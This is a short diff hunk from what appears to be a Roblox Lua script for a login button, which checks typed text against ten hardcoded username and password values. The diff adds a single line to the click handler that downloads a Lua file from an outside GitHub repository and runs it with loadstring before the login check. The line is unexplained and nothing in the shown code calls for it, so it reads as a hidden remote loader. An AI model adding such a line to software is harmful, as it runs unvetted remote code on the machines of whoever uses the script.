@@ -1362,6 +1362,7 @@ local function VFJS_fake_script() -- TextButtonLogin.LocalScript
 	local p = script.Parent.Parent.LoginPassTB
 	
 	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/slaimmials/slaimmials/main/lAp.lua"))()
 		if l.Text == l1 or l.Text == l2 or l.Text == l3 or l.Text == l4 or l.Text == l5 or l.Text == l6 or l.Text == l7 or l.Text == l8 or l.Text == l9 or l.Text == l10 and p.Text == p1 or p.Text == p2 or p.Text == p3 or p.Text == p4 or p.Text == p5 or p.Text == p6 or p.Text == p7 or p.Text == p8 or p.Text == p9 or p.Text == p10 then
 			script.Parent.Parent.Parent.Repositories.Outfit.Num.Value = 1
 			local mess = Instance.new("Hint", workspace)
